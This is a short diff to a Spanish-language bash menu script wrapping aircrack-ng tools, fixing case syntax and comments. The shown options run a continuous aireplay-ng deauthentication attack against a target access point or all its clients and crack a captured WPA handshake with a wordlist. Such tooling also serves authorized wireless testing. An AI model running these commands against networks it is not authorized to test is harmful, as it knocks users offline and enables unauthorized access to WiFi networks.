@@ -33,7 +33,7 @@ while true; do
             read -p "Enter para volver al menú"
         ;;
         3)
-            # Mon mode off
+            # Get Handshake
             read -p "MAC del ACCES POINT objetivo: " mac_ap
             read -p "MAC del cliente objetivo o FF:FF:FF:FF:FF:FF para atacar todos: " mac_cliente
             aireplay-ng --deauth 0 -a $mac_ap -c $mac_cliente wlan0
@@ -55,9 +55,11 @@ while true; do
             aircrack-ng $handshake_file -w $wordlist_file
             
             read -p "Enter para volver al menú"
-            6)
-                # Salir del programa
-                break
-            ;;
+        ;;
+        6)
+            # Exit
+            break
+        ;;
     esac
 done
+
